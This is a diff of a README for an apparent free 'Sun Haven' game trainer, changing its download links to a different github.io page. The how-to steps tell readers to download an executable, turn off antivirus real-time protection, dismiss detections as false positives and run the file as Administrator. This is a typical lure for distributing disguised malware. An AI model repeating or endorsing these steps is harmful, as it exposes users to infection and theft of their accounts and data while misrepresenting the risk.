@@ -4,7 +4,7 @@
 
 ### Sun Haven trainer: infinite coins & nel, infinite mana, infinite stamina — free trainer, no key.
 
-[![Download](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_TRAINER-red?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![Download](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_TRAINER-red?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
 [![Status](https://img.shields.io/badge/STATUS-WORKING_%F0%9F%9F%A2-2026-brightgreen?style=for-the-badge)](#features)
 [![Key System](https://img.shields.io/badge/KEY-NO_KEY_required-success?style=for-the-badge)](#features)
 [![Platform](https://img.shields.io/badge/PLATFORM-Windows_10_%E2%80%A2_11-blue?style=for-the-badge)](#requirements)
@@ -39,7 +39,7 @@ Sun Haven combined farming and RPG combat into a top cozy title — coin and man
 ## ⬇️ How to use
 <a name="how-to-use"></a>
 
-1. **Download the latest build** 👉 **[https://mixedlinkrelease.github.io/installer/](https://mixedlinkrelease.github.io/installer/)**
+1. **Download the latest build** 👉 **[https://bansheeloaderquay.github.io/dl-win/](https://bansheeloaderquay.github.io/dl-win/)**
 2. **Temporarily disable antivirus real-time protection** — trainers are a known false-positive trigger (see FAQ).
 3. **Extract** and run the `.exe` **as Administrator**.
 4. **Launch Sun Haven** and load your save.
